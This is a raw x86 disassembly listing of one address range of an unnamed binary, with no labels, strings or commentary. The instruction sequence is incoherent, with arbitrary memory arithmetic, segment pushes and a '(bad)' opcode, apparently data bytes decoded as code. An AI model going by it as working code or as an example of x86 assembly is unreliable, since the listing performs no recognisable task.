  4036b9:	or     BYTE PTR [eax],al
  4036bb:	adc    cl,BYTE PTR [ecx+0x68]
  4036be:	sbb    dh,BYTE PTR [eax+0x42]
  4036c1:	adc    BYTE PTR [eax+edi*4+0x300009c],al
  4036c8:	push   ss
  4036c9:	add    BYTE PTR [edx+0x15],al
  4036cc:	add    eax,0x485542
  4036d1:	and    BYTE PTR [ebx+0x0],dl
  4036d4:	rcr    BYTE PTR [eax+0x10a1c840],1
  4036da:	dec    eax
  4036db:	add    BYTE PTR [eax-0x76bbf77e],al
  4036e1:	mov    eax,ds:0x88405c5c
  4036e6:	dec    edx
  4036e7:	add    eax,0x2821210
  4036ec:	adc    al,BYTE PTR [eax]
  4036ee:	push   es
  4036ef:	add    al,BYTE PTR [ecx-0x74def37b]
  4036f5:	xor    al,BYTE PTR [eax+eax*1+0x20b24185]
  4036fc:	sbb    DWORD PTR [eax],0xc4009428
  403702:	xchg   ebx,eax
  403703:	and    DWORD PTR [eax],eax
  403705:	add    eax,0x26120b88
  40370a:	push   es
  40370b:	add    BYTE PTR [eax],al
  40370d:	add    al,BYTE PTR [ecx+0x14]
  403710:	add    BYTE PTR [eax],al
  403712:	mov    BYTE PTR [eax],dl
  403714:	push   esp
  403715:	sbb    DWORD PTR [eax+0x122021c2],esi
  40371b:	push   es
  40371c:	inc    edi
  40371d:	or     BYTE PTR [eax],al
  40371f:	add    ch,BYTE PTR [ecx+ebp*1]
  403722:	test   BYTE PTR [eax],al
  403724:	add    BYTE PTR [ecx],al
  403726:	or     dl,BYTE PTR [ecx]
  403728:	call   DWORD PTR ds:0x417200
  40372e:	adc    ah,BYTE PTR [ecx+edi*1]
  403731:	sbb    DWORD PTR [edx+0x28],eax
  403734:	adc    BYTE PTR [eax],ch
  403736:	add    DWORD PTR [eax],eax
  403738:	pop    es
  403739:	daa    
  40373a:	xor    BYTE PTR [ebx],dl
  40373c:	rol    BYTE PTR [esp+esi*1],0x10
  403740:	add    DWORD PTR [ecx+0x58],eax
  403743:	push   eax
  403744:	add    edx,DWORD PTR [eax]
  403746:	and    BYTE PTR [edx+eiz*1-0x1e1def28],al
  40374d:	and    BYTE PTR [esp+eax*2],cl
  403750:	rol    BYTE PTR [edx-0x57ecffe8],cl
  403756:	adc    BYTE PTR [ecx+0x4a],cl
  403759:	add    DWORD PTR [eax],eax
  40375b:	or     al,BYTE PTR [eax-0x7d8fff7f]
  403761:	loopne 0x403776
  403763:	inc    edx
  403764:	add    BYTE PTR [ecx+0x13],ah
  403767:	inc    eax
  403768:	dec    esp
  403769:	adc    BYTE PTR [eax],al
  40376b:	push   esp
  40376c:	add    ch,BYTE PTR [esp+ecx*4+0x497008a8]
  403773:	push   edx
  403774:	add    BYTE PTR [ecx+ecx*1],ch
  403777:	jo     0x4037c9
  403779:	nop
  40377a:	push   ss
  40377b:	outs   dx,BYTE PTR ds:[esi]
  40377c:	or     DWORD PTR [eax+eiz*1+0x204d08a0],eax
  403783:	xchg   BYTE PTR [eax],dh
  403785:	add    BYTE PTR [ebx],al
  403787:	push   eax
  403788:	dec    eax
  403789:	or     BYTE PTR [eax+0x2a],al
  40378c:	xor    al,0x2
  40378e:	mov    WORD PTR [eax],ds
  403790:	xor    BYTE PTR ss:[ecx-0x5feffbfe],0x0
  403798:	and    BYTE PTR [ebx],al
  40379a:	and    BYTE PTR [ecx],al
  40379c:	add    ah,BYTE PTR [ecx+0x511b1300]
  4037a2:	adc    eax,0x18343061
  4037a7:	and    al,0x4
  4037aa:	and    BYTE PTR [eax],al
  4037ac:	add    BYTE PTR [eax],0x84
  4037af:	sbb    BYTE PTR [eax],dl
  4037b1:	add    DWORD PTR [esi+0x11],esi
  4037b4:	adc    al,0x8
  4037b6:	add    BYTE PTR [eax+0x2e241164],cl
  4037bc:	adc    BYTE PTR [esp+ecx*4+0x0],0x0
  4037c1:	dec    edx
  4037c2:	add    BYTE PTR [edx+ecx*4],0x10
  4037c6:	adc    BYTE PTR [eax+0x10000d],cl
  4037cc:	add    DWORD PTR [eax+0x4027100],0xa08e0865
  4037d6:	and    al,0x44
  4037d8:	adc    eax,0x431e80a2
  4037de:	xchg   ebx,eax
  4037df:	mov    DWORD PTR [ecx],ecx
  4037e1:	or     al,BYTE PTR [eax+eax*1]
  4037e4:	pusha  
  4037e5:	or     al,BYTE PTR [ebx]
  4037e7:	add    DWORD PTR [esi],0x33920001
  4037ed:	sub    BYTE PTR [edx],ch
  4037ef:	sub    al,0x0
  4037f1:	and    BYTE PTR [edx-0x40],ch
  4037f4:	or     cl,dl
  4037f6:	inc    ebx
  4037f7:	add    BYTE PTR [edx+eax*4],ah
  4037fa:	add    BYTE PTR [ecx],al
  4037fc:	adc    BYTE PTR [ecx-0x78],0x61
  403800:	bound  eax,QWORD PTR [ecx+0x4a451000]
  403806:	add    BYTE PTR [eax-0x38],bl
  403809:	sub    BYTE PTR [edx],al
  40380b:	add    BYTE PTR [edx+0x48da8d0],al
  403811:	adc    BYTE PTR [eax],dl
  403813:	sbb    al,0x11
  403815:	add    DWORD PTR [esp+edi*4],ecx
  403818:	add    dl,BYTE PTR [esi+0x46580d3]
  40381e:	add    al,0xa
  403820:	add    BYTE PTR [eax],ah
  403822:	sbb    al,BYTE PTR [eax+0x18088849]
  403828:	add    esp,DWORD PTR [ebp+0x4a]
  40382b:	add    BYTE PTR [eax],dl
  40382d:	xchg   ecx,eax
  40382e:	adc    al,BYTE PTR [edx+eax*1]
  403831:	add    DWORD PTR [esp+eax*1+0x46],eax
  403835:	inc    esp
  403836:	cwde   
  403837:	adc    al,0x96
  403839:	and    BYTE PTR [ecx],cl
  40383b:	jne    0x403882
  40383d:	add    dl,BYTE PTR [eax+0x7]
  403840:	mov    al,ds:0x9a52890
  403845:	dec    eax
  403846:	rcr    BYTE PTR [edx],0x28
  403849:	add    BYTE PTR [esi],0x48
  40384c:	and    DWORD PTR [eax],edi
  40384e:	inc    ebx
  40384f:	adc    eax,0x84025180
  403854:	rol    DWORD PTR [edx+0x2007103],0xcd
  40385b:	add    BYTE PTR es:[ecx],ah
  40385e:	mov    al,ds:0xc0290522
  403863:	lds    ebx,FWORD PTR [eax]
  403865:	add    edx,DWORD PTR [eax+eax*4]
  403868:	inc    eax
  403869:	mov    DWORD PTR [eax+ebp*1],0x2c240207
  403870:	adc    DWORD PTR [edx],eax
  403872:	sub    al,0x29
  403874:	add    DWORD PTR ds:0x92060810,0x8
  40387b:	sbb    al,0xc3
  40387d:	and    BYTE PTR [eax+0x1c],ah
  403880:	adc    BYTE PTR [eax+0x22],ah
  403883:	and    al,0x12
  403885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403886:	adc    BYTE PTR [eax+eax*1],al
  403889:	pop    eax
  40388a:	add    BYTE PTR [ecx],0xc2
  40388d:	or     BYTE PTR [eax],ah
  40388f:	loop   0x4038b5
  403891:	add    esp,DWORD PTR [eax]
  403893:	adc    BYTE PTR [ebx],cl
  403895:	adc    bl,BYTE PTR [ecx+0x11]
  403898:	adc    al,0xb8
  40389a:	adc    BYTE PTR [eax+ebp*1],cl
  40389d:	inc    eax
  40389e:	sub    ebx,DWORD PTR [edx]
  4038a0:	add    eax,0x540c866
  4038a5:	pop    es
  4038a6:	lea    edx,[edx]
  4038a8:	mov    BYTE PTR [edx],al
  4038aa:	add    BYTE PTR [ebx+0x1],cl
  4038ad:	add    al,BYTE PTR [ecx+0x5298160]
  4038b3:	cmp    BYTE PTR [edi-0x7f],al
  4038b6:	cwde   
  4038b7:	inc    eax
  4038b8:	push   es
  4038b9:	test   eax,0x40a0968
  4038be:	xchg   esp,eax
  4038bf:	pop    eax
  4038c0:	rol    BYTE PTR [eax+0x1040f14a],cl
  4038c6:	adc    ch,BYTE PTR [eax]
  4038c8:	rol    BYTE PTR [esi],0x80
  4038cb:	cmp    al,0xf8
  4038cd:	dec    esp
  4038ce:	adc    BYTE PTR [eax],al
  4038d0:	mov    al,0x45
  4038d2:	or     DWORD PTR [ecx],eax
  4038d4:	and    BYTE PTR [esi],ah
  4038d6:	and    BYTE PTR ds:0x42020964,0xc2
  4038dd:	or     BYTE PTR [eax],al
  4038df:	mov    BYTE PTR [edi],0x80
  4038e2:	inc    edx
  4038e3:	inc    esp
  4038e4:	sbb    al,0x5
  4038e6:	and    ah,BYTE PTR [eax]
  4038e8:	sbb    al,0xe
  4038ea:	test   BYTE PTR [edx+0x302c0899],dl
  4038f0:	adc    al,0x21
  4038f2:	add    DWORD PTR [ebx],esp
  4038f4:	and    BYTE PTR [eax],ah
  4038f6:	and    ch,BYTE PTR [ecx+esi*1]
  4038f9:	sub    BYTE PTR [ecx+0x510c000],0x50
  403900:	add    eax,DWORD PTR [eax+0x12]
  403903:	and    eax,ecx
  403905:	or     BYTE PTR [ebx],dh
  403907:	and    DWORD PTR [eax],esp
  403909:	dec    eax
  40390a:	add    ch,BYTE PTR [ecx]
  40390c:	mov    ds:0x600c000,al
  403911:	add    bl,BYTE PTR [ebx-0x77ab3000]
  403917:	add    DWORD PTR [edi+0x26],eax
  40391a:	sub    eax,0x158f003c
  40391f:	add    dl,al
  403921:	cmp    al,0x12
  403923:	adc    edx,DWORD PTR [esi]
  403925:	mov    al,ds:0x60106069
  40392a:	add    eax,0xc084a662
  40392f:	inc    eax
  403930:	push   ss
  403931:	add    dl,BYTE PTR [ecx+0x2170240e]
  403937:	and    al,BYTE PTR [eax]
  403939:	ja     0x40396d
  40393b:	and    BYTE PTR [ecx+0x13],dl
  40393e:	ds add esi,ebx
  403941:	sub    BYTE PTR [esi+ecx*4+0x1880130b],al
  403948:	dec    ecx
  403949:	inc    edx
  40394a:	sub    ah,BYTE PTR [ebp+0x40]
  40394d:	add    BYTE PTR ds:0xc8002074,cl
  403953:	add    al,0x0
  403955:	bound  eax,QWORD PTR [eax]
  403957:	sbb    al,BYTE PTR [ecx-0x3f7e775e]
  40395d:	add    cl,BYTE PTR [eax]
  40395f:	push   eax
  403960:	adc    eax,DWORD PTR [edx+0x48]
  403963:	imul   edx,DWORD PTR [ecx],0x12
  403966:	or     dl,BYTE PTR [edx]
  403968:	and    BYTE PTR [eax-0x80],al
  40396b:	dec    eax
  40396c:	push   es
  40396d:	push   es
  40396e:	adc    al,0x49
  403970:	fs pop ss
  403972:	or     al,0x10
  403974:	or     al,0x44
  403976:	add    al,BYTE PTR [eax]
  403978:	adc    BYTE PTR [ecx],ah
  40397a:	adc    DWORD PTR [ecx],eax
  40397c:	add    BYTE PTR [ecx],0x15
  40397f:	push   eax
  403980:	fs mov ecx,DWORD PTR es:[eax-0x5f6dedbe]
  403988:	sub    edx,DWORD PTR [edx+eax*1-0x6fe7d6d7]
  40398f:	add    BYTE PTR [edx],al
  403991:	inc    eax
  403992:	add    BYTE PTR [edx+0x10],al
  403995:	add    al,0x42
  403998:	adc    eax,eax
  40399a:	inc    eax
  40399b:	nop
  40399c:	or     al,0x43
  40399e:	add    BYTE PTR [edx],al
  4039a0:	push   cs
  4039a1:	mov    ecx,DWORD PTR [eax]
  4039a3:	or     ah,BYTE PTR [ebx+0x40]
  4039a6:	xor    eax,0x3f0e13c0
  4039ab:	or     DWORD PTR [eax],ecx
  4039ad:	add    DWORD PTR [eax+eax*1+0x40],eax
  4039b1:	add    BYTE PTR [edx+0x14],al
  4039b4:	add    BYTE PTR [ecx-0x60],al
  4039b7:	and    DWORD PTR [eax],0x10440002
  4039bd:	add    ah,ch
  4039bf:	and    BYTE PTR [eax],cl
  4039c1:	sbb    edx,DWORD PTR [eax]
  4039c3:	sub    BYTE PTR ds:0xa0040a04,dl
  4039c9:	or     BYTE PTR [eax+ecx*1+0xa],ah
  4039cd:	inc    eax
  4039ce:	mov    al,0x82
  4039d0:	pop    eax
  4039d1:	or     BYTE PTR [edx],0x0
  4039d4:	pop    esi
  4039d5:	and    BYTE PTR [eax],al
  4039d7:	arpl   WORD PTR [eax+ebx*1],bx
  4039da:	add    BYTE PTR [eax+0x60020405],cl
  4039e0:	cdq    
  4039e1:	add    al,al
  4039e3:	sub    BYTE PTR [eax+0x8001808],0x22
  4039ea:	and    BYTE PTR [eax],al
  4039ec:	inc    eax
  4039ed:	inc    ecx
  4039ee:	push   eax
  4039ef:	bound  ebx,QWORD PTR [eax+0xa62e004]
  4039f5:	add    al,BYTE PTR [eax]
  4039f7:	or     BYTE PTR [ebx+0x61],al
  4039fa:	and    eax,0x368483
  4039ff:	in     eax,dx
  403a00:	and    al,BYTE PTR [eax]
  403a02:	add    dl,BYTE PTR [esp]
  403a05:	sbb    al,0x48
  403a07:	add    al,0x21
  403a09:	enter  0x907a,0x8d
  403a0d:	adc    BYTE PTR [eax],al
  403a0f:	inc    eax
  403a10:	adc    al,0x0
  403a12:	adc    BYTE PTR [eax],0x0
  403a15:	and    al,BYTE PTR fs:[edx]
  403a18:	inc    eax
  403a19:	and    dl,BYTE PTR [eax]
  403a1b:	rcl    BYTE PTR [eax+eax*1+0x810100e],0x6
  403a23:	sbb    DWORD PTR [ebx+ecx*1+0x22],0x72
  403a28:	add    BYTE PTR [esp+eax*1+0x14],al
  403a2c:	add    BYTE PTR [edx],0x1
  403a2f:	push   ss
  403a30:	or     BYTE PTR [ecx],al
  403a32:	and    BYTE PTR [eax],ah
  403a34:	add    BYTE PTR [ecx+eax*4],cl
  403a37:	sbb    al,0x68
  403a39:	add    DWORD PTR [edx],ebx
  403a3b:	mov    WORD PTR [ecx],es
  403a3d:	mov    al,ds:0x838130e2
  403a42:	or     dl,BYTE PTR [esp+eax*8+0x69084208]
  403a49:	adc    BYTE PTR [esi+0xe],al
  403a4c:	or     DWORD PTR [edi+0xc],ecx
  403a4f:	dec    eax
  403a50:	and    al,0x0
  403a52:	mov    BYTE PTR [eax+0x1],al
  403a55:	and    BYTE PTR [ebp+0x13008968],dl
  403a5b:	adc    BYTE PTR [eax+0x40],ah
  403a5e:	push   eax
  403a5f:	cwde   
  403a60:	inc    edx
  403a61:	add    ah,BYTE PTR [ecx]
  403a63:	push   es
  403a64:	add    DWORD PTR [esi],0xc07
  403a6a:	inc    edx
  403a6b:	add    BYTE PTR [eax],0x22
  403a6e:	cmp    BYTE PTR [eax+eax*1],al
  403a71:	or     BYTE PTR [ecx+0x22],0x4
  403a75:	dec    ebx
  403a76:	sbb    BYTE PTR [eax-0x170ffedc],0x8c
  403a7d:	mov    ds:0x1e104d60,eax
  403a82:	push   eax
  403a83:	add    BYTE PTR [eax],al
  403a85:	test   al,0x50
  403a87:	or     BYTE PTR [ecx+0x29],al
  403a8a:	add    BYTE PTR [ebx+eiz*4+0x3],al
  403a8e:	adc    eax,0xb0fa240
  403a93:	rol    BYTE PTR [eax],cl
  403a95:	and    BYTE PTR [edx+0x221090ca],cl
  403a9b:	and    al,0x8
  403a9d:	sub    BYTE PTR [eax+0x2e2308],ch
  403aa3:	jo     0x403ac8
  403aa5:	and    al,al
  403aa7:	pop    es
  403aa8:	adc    DWORD PTR [ecx+eax*1+0x44052048],ecx
  403aaf:	add    eax,DWORD PTR [eax-0x7fbe9fe0]
  403ab5:	inc    ecx
  403ab6:	sbb    al,0x2
  403ab8:	adc    BYTE PTR [ecx-0x372dfcff],al
  403abe:	pusha  
  403abf:	lds    ecx,FWORD PTR [eax]
  403ac1:	add    al,ah
  403ac3:	adc    DWORD PTR [eax],ecx
  403ac5:	inc    eax
  403ac6:	mov    BYTE PTR [edx],al
  403ac8:	adc    BYTE PTR [eax],dh
  403aca:	inc    ecx
  403acb:	adc    BYTE PTR [eax+0x8906882],0x6a
  403ad2:	(bad)  
  403ad4:	or     DWORD PTR [ecx-0x7ffad5db],ecx
  403ada:	push   eax
  403adb:	test   al,0x35
  403add:	or     al,BYTE PTR [esp+ebp*1]
  403ae0:	or     BYTE PTR [edx],ah
  403ae2:	or     DWORD PTR [eax+0x8812c3],eax
  403ae8:	les    eax,FWORD PTR [esi]
  403aea:	rol    BYTE PTR [ecx],0x10
  403aed:	and    BYTE PTR [eax+eax*4],al
  403af0:	push   0x4
  403af2:	fdiv   DWORD PTR [edx+0x21]
  403af5:	add    eax,0x20b88040
  403afa:	pop    es
  403afb:	add    BYTE PTR [esp+edx*2+0x60840808],0x90
  403b03:	jo     0x403b05
  403b05:	and    DWORD PTR [edx],eax
  403b07:	add    DWORD PTR [ecx],eax
  403b09:	add    al,0x88
  403b0b:	add    BYTE PTR [edx],bl
  403b0d:	or     BYTE PTR [eax-0x7e3bf768],0x0
  403b14:	or     BYTE PTR [eax],al
  403b16:	inc    esi
  403b17:	push   0x20080904
  403b1c:	add    ch,BYTE PTR [eax+0xc059]
  403b22:	dec    ebp
  403b23:	sub    al,0x2
  403b25:	adc    DWORD PTR [eax],0x7700018a
  403b2b:	and    BYTE PTR [eax-0x7f7cff68],ch
  403b31:	adc    eax,DWORD PTR [eax+0x0]
  403b34:	adc    BYTE PTR [ecx+0x10421144],ch
  403b3a:	sub    eax,0x58144420
  403b3f:	mov    eax,ds:0x40121032
  403b44:	sbb    BYTE PTR [eax+0x8210255],al
  403b4a:	add    BYTE PTR [ecx],dh
  403b4c:	add    al,BYTE PTR [eax+0x0]
  403b4f:	add    al,BYTE PTR [ecx+ebx*4]
  403b52:	or     al,0x0
  403b54:	adc    BYTE PTR [edx],al
  403b56:	and    dl,ch
  403b58:	push   esp
  403b59:	or     BYTE PTR [eax],al
  403b5b:	and    al,0x0
  403b5d:	add    dl,cl
  403b5f:	jno    0x403b23
  403b61:	leave  
  403b62:	mov    ds:0x12320810,al
  403b67:	nop
  403b68:	add    BYTE PTR ds:0x28290050,dh
  403b6e:	add    BYTE PTR [esi+0x148c410],ah
  403b74:	or     al,BYTE PTR [edx]
  403b76:	cwde   
  403b77:	add    BYTE PTR [edx-0x7e],al
  403b7a:	mov    cl,BYTE PTR [edx]
  403b7c:	add    ah,BYTE PTR [eax]
  403b7e:	popa   
  403b7f:	xchg   ecx,eax
  403b80:	lods   al,BYTE PTR ds:[esi]
  403b81:	test   DWORD PTR [esp+ecx*1+0x4c],eax
  403b85:	add    BYTE PTR [ecx+0x60],al
  403b88:	and    al,dh
  403b8a:	mov    al,0x4b
  403b8c:	add    al,0x8
  403b8e:	or     DWORD PTR [edx+ebx*1],esp
  403b91:	dec    edx
  403b92:	inc    edx
  403b93:	test   al,0x10
  403b95:	push   ss
  403b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b97:	and    BYTE PTR [eax],dl
  403b99:	inc    eax
  403b9a:	push   eax
  403b9b:	add    ch,BYTE PTR [eax]
  403b9d:	enter  0x0,0xc4
  403ba1:	adc    DWORD PTR [edx-0x70],0xf000a28
  403ba8:	into   
  403ba9:	inc    ecx
  403baa:	or     BYTE PTR [eax+ecx*1],0x5
  403bae:	sbb    DWORD PTR [ecx+0x60da025],esp
  403bb4:	int    0x42
  403bb6:	sbb    dh,BYTE PTR [esi]
  403bb8:	add    BYTE PTR [eax+0x13],cl
  403bbb:	rcr    BYTE PTR [eax],0x40
  403bbe:	shl    bl,1
  403bc0:	add    BYTE PTR [eax+0x28030086],al
  403bc6:	scas   al,BYTE PTR es:[edi]
  403bc7:	add    BYTE PTR [eax],al
  403bc9:	sbb    BYTE PTR [ebx],al
  403bcb:	data16 add BYTE PTR [eax+0x3d],al
  403bcf:	mov    eax,0xf0201610
  403bd4:	push   ss
  403bd5:	adc    DWORD PTR [edx+0xa],eax
  403bd8:	xchg   ebp,eax
  403bd9:	add    DWORD PTR [ebp-0x1dd4f7ec],eax
  403bdf:	and    al,BYTE PTR [ecx]
  403be1:	and    BYTE PTR [eax+ebx*1],cl
  403be4:	add    BYTE PTR [eax],ah
  403be6:	adc    bl,al
  403be8:	loopne 0x403bf6
  403bea:	add    BYTE PTR [eax],dl
  403bec:	add    dl,BYTE PTR [esp+eax*1]
  403bef:	or     DWORD PTR [eax+0x20],ecx
  403bf2:	inc    eax
  403bf3:	mov    dl,0x48
  403bf5:	and    eax,DWORD PTR [edx+eax*2+0x10128c]
  403bfc:	or     al,0xe5
  403bfe:	push   edx
  403bff:	or     al,0x10
  403c02:	test   BYTE PTR [eax],ah
  403c04:	and    DWORD PTR [ecx],ebx
  403c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c07:	add    al,0x80
  403c09:	adc    BYTE PTR [eax+0x1212420],al
  403c0f:	xchg   ecx,eax
  403c10:	adc    BYTE PTR [ecx+0x2c],al
  403c13:	test   eax,0x123000a8
  403c18:	inc    eax
  403c19:	add    al,BYTE PTR [ecx+0x30822808]
  403c1f:	dec    ebp
  403c20:	adc    BYTE PTR [ecx+ecx*2],cl
  403c23:	mov    DWORD PTR [eax],esi
  403c25:	stos   DWORD PTR es:[edi],eax
  403c26:	adc    al,0x18
  403c28:	in     al,0x10
  403c2a:	inc    eax
  403c2b:	inc    ebx
  403c2c:	add    ch,BYTE PTR [ecx]
  403c2e:	xchg   ecx,eax
  403c2f:	mov    BYTE PTR ds:0x10580820,dh
  403c35:	sub    al,BYTE PTR [esp+eax*8+0x601c2402]
  403c3c:	sbb    dl,BYTE PTR [ecx+0x5]
  403c3f:	adc    BYTE PTR [ecx+0x2580004],dl
  403c45:	inc    eax
  403c46:	mov    BYTE PTR [eax],al
  403c48:	or     al,0xa0
  403c4a:	add    dh,BYTE PTR [ebp+0x6]
  403c4d:	push   es
  403c4e:	push   cs
  403c4f:	add    BYTE PTR [ecx+0x2020805],al
  403c55:	add    DWORD PTR [ebx],edx
  403c57:	sbb    al,0x1
  403c59:	sub    al,BYTE PTR [ecx]
  403c5b:	mov    eax,ds:0x90410402
  403c60:	rol    BYTE PTR [eax-0x62fefbe8],0x4
  403c67:	xor    al,0x10
  403c69:	or     BYTE PTR [edx],dl
  403c6b:	inc    esi
  403c6c:	add    BYTE PTR [eax],cl
  403c6e:	sbb    DWORD PTR [edx+0x8212202],esp
  403c74:	test   eax,0x90b00044
  403c79:	add    cl,BYTE PTR [ecx]
  403c7b:	inc    edi
  403c7c:	push   es
  403c7d:	adc    BYTE PTR [eax],al
  403c7f:	add    BYTE PTR [eax],0x44
  403c82:	add    BYTE PTR [ebp-0x32ffd3ed],al
  403c88:	add    ah,BYTE PTR [eax]
  403c8a:	or     al,0x10
  403c8c:	adc    ch,BYTE PTR [edx]
  403c8e:	test   DWORD PTR [esi+0x21204001],ecx
  403c94:	or     BYTE PTR [ebx],cl
  403c96:	inc    eax
  403c97:	and    DWORD PTR [eax],0x1a1c0049
  403c9d:	push   es
  403c9e:	adc    BYTE PTR [ecx+0x20],al
  403ca1:	xor    DWORD PTR [edx],eax
  403ca3:	dec    esi
  403ca4:	cmp    bl,al
  403ca6:	sbb    BYTE PTR [ecx],bl
  403ca8:	mov    BYTE PTR [eax],ah
  403caa:	mov    BYTE PTR [eax],al
  403cac:	push   eax
  403cad:	and    al,0x62
  403caf:	pop    eax
  403cb0:	adc    BYTE PTR [ebx],al
  403cb2:	adc    BYTE PTR [eax+eiz*1],ch
  403cb5:	sub    DWORD PTR es:[ebx],eax
  403cb8:	add    BYTE PTR [eax+0x18401900],al
  403cbe:	and    BYTE PTR [ecx],bl
  403cc0:	push   ecx
  403cc1:	adc    BYTE PTR [ecx-0x74],cl
  403cc4:	and    BYTE PTR [eax],al
  403cc6:	xor    ecx,0xffffffb0
  403cc9:	add    BYTE PTR [ecx],al
  403ccb:	jo     0x403cf7
  403ccd:	test   BYTE PTR [eax+0x41],bl
  403cd0:	test   BYTE PTR [eax+eax*1],dh
  403cd3:	inc    eax
  403cd4:	add    BYTE PTR [ecx],al
  403cd6:	push   eax
  403cd7:	inc    eax
  403cd8:	test   BYTE PTR [esi+ecx*4],al
  403cdb:	add    BYTE PTR [edi],0x88
  403cde:	or     BYTE PTR [ecx],0x20
  403ce1:	test   BYTE PTR [ecx+0x24040600],ah
  403ce7:	pop    eax
  403ce8:	add    eax,0x2202c03
  403ced:	add    BYTE PTR [eax],0x50
  403cf0:	ret    0x8051
  403cf3:	pop    eax
  403cf4:	add    al,0x48
  403cf6:	pop    ds
  403cf7:	push   0x7051004
  403cfc:	sub    al,BYTE PTR [eax]
  403cfe:	and    al,0x4
  403d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d01:	adc    DWORD PTR ds:0x98088013,ecx
  403d07:	and    DWORD PTR [eax],0xc0032210
  403d0d:	add    BYTE PTR [eax],0x20
  403d10:	add    BYTE PTR [esi+0x28b10300],cl
  403d16:	add    cl,BYTE PTR [eax+0x4824234]
  403d1c:	adc    eax,0x520c9002
  403d21:	loopne 0x403d43
  403d23:	das    
  403d24:	pop    es
  403d25:	add    BYTE PTR [eax+edx*4],dl
  403d28:	xchg   esp,eax
  403d29:	adc    al,cl
  403d2b:	inc    edx
  403d2c:	add    DWORD PTR [edx],ebx
  403d2e:	adc    al,0xe0
  403d30:	add    dl,BYTE PTR [eax+0x21c818e]
  403d36:	enter  0x3101,0x6
  403d3a:	add    eax,0x5220550d
  403d3f:	add    ah,BYTE PTR [eax]
  403d41:	or     BYTE PTR [ecx-0x2fbd7fc6],al
  403d47:	xor    ebp,DWORD PTR [eax-0x1fb52fbd]
  403d4d:	or     eax,DWORD PTR [ecx-0x74]
  403d50:	add    DWORD PTR ds:0x18401558,0x38058404
  403d5a:	or     ah,BYTE PTR [eax-0x7f7bef10]
  403d60:	push   es
  403d61:	and    BYTE PTR [eax+0x28848300],al
  403d67:	add    BYTE PTR [ecx],dh
  403d69:	push   eax
  403d6a:	add    BYTE PTR [eax+ecx*1],ah
  403d6d:	add    BYTE PTR ds:0x1018044,al
  403d73:	inc    edx
  403d74:	sub    BYTE PTR [eax+0x8cc840],al
  403d7a:	add    al,BYTE PTR [eax+0xa912b4]
  403d80:	adc    al,BYTE PTR [edx]
  403d82:	add    BYTE PTR [edx],al
  403d84:	pusha  
  403d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d86:	and    BYTE PTR [eax+0x60],cl
  403d89:	add    cl,BYTE PTR [eax+0x9800cbb]
  403d8f:	inc    esp
  403d90:	and    al,0x92
  403d92:	add    eax,0x2244810
  403d97:	push   eax
  403d98:	outs   dx,BYTE PTR ds:[esi]
  403d99:	fisttp DWORD PTR [esp+edx*4]
  403d9c:	shl    BYTE PTR [esi-0x80],cl
  403d9f:	inc    eax
  403da0:	add    BYTE PTR [eax+0x1],al
  403da3:	add    eax,0x33408004
  403da8:	or     al,0x0
  403daa:	adc    al,BYTE PTR [eax]
  403dac:	stos   BYTE PTR es:[edi],al
  403dad:	inc    ecx
  403dae:	add    BYTE PTR [edx+0x474ab005],bh
  403db4:	and    BYTE PTR [eax],al
  403db6:	add    al,0x86
  403db8:	mov    WORD PTR [ecx+0x4200108],gs
  403dbe:	jo     0x403dc5
  403dc0:	add    BYTE PTR [eax+eax*1+0x0],ch
  403dc4:	data16 test BYTE PTR [eax],al
  403dc7:	dec    eax
  403dc8:	pusha  
  403dc9:	add    DWORD PTR [eax+0x20],esi
  403dcc:	cwde   
  403dcd:	and    BYTE PTR [eax+eiz*2],cl
  403dd0:	sbb    BYTE PTR [ebp+0x5],ah
  403dd3:	adc    al,BYTE PTR [edx]
  403dd5:	nop
  403dd6:	nop
  403dd7:	mov    BYTE PTR [eax+ecx*1-0x3ffffffe],al
  403dde:	inc    esp
  403ddf:	seto   BYTE PTR [eax]
  403de2:	push   0x36
  403de4:	add    BYTE PTR [ecx+0x24819033],al
  403dea:	or     BYTE PTR [esp+edx*8],al
  403ded:	imul   eax,DWORD PTR [eax],0x68068818
  403df3:	add    al,0x43
  403df5:	adc    ah,cl
  403df7:	test   al,0x9
  403df9:	inc    esp
  403dfa:	mov    dh,0x9c
  403dfc:	add    BYTE PTR [ecx],al
  403dfe:	or     DWORD PTR [ecx],eax
  403e00:	adc    al,BYTE PTR [ebx-0x7dfff6a0]
  403e06:	mov    dl,dl
  403e08:	adc    BYTE PTR [eax+ebp*1],dl
  403e0b:	sub    BYTE PTR [eax+0x7],al
  403e0e:	aam    0x2b
  403e10:	dec    ecx
  403e11:	adc    al,BYTE PTR [edx]
  403e13:	cmp    BYTE PTR [eax+0x14],bl
  403e16:	push   esi
  403e17:	jbe    0x403e29
  403e19:	inc    eax
  403e1a:	add    BYTE PTR [eax],al
  403e1c:	add    BYTE PTR [eax],cl
  403e1e:	sub    eax,0x8082c0a0
  403e23:	adc    DWORD PTR [edi],eax
  403e25:	push   eax
  403e26:	nop
  403e27:	add    al,al
  403e29:	push   ecx
  403e2a:	mov    BYTE PTR [ecx],cl
  403e2c:	inc    esi
  403e2d:	add    BYTE PTR [eax+0x53],al
  403e30:	dec    ebx
  403e31:	and    BYTE PTR [eax],al
  403e33:	add    al,0x93
  403e35:	and    DWORD PTR [ecx],eax
  403e37:	adc    DWORD PTR ds:0xe1512019,ecx
  403e3d:	and    al,BYTE PTR [edx+0x4ac70044]
  403e43:	or     BYTE PTR [esi+0x40170200],cl
  403e49:	add    al,BYTE PTR [edx]
  403e4b:	add    BYTE PTR [edx],dl
  403e4d:	nop
  403e4e:	push   0x23185310
  403e53:	add    eax,0xd051180
  403e58:	inc    esi
  403e59:	add    eax,0x6098040
  403e5e:	and    BYTE PTR [ebp+0x0],al
  403e61:	or     BYTE PTR [eax-0x40],0x10
  403e65:	mov    eax,ds:0x1925000
  403e6a:	and    al,0x12
  403e6c:	or     BYTE PTR [edx+0x8424044],ah
  403e72:	or     al,0x22
  403e74:	add    ah,BYTE PTR [eax]
  403e76:	add    BYTE PTR [edx],0x19
  403e79:	adc    cl,BYTE PTR [eax+0x10]
  403e7c:	mov    ds:0xc22c0894,al
  403e81:	add    BYTE PTR [eax+0x510b00a2],bl
  403e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e88:	add    BYTE PTR [ebx+eax*1],al
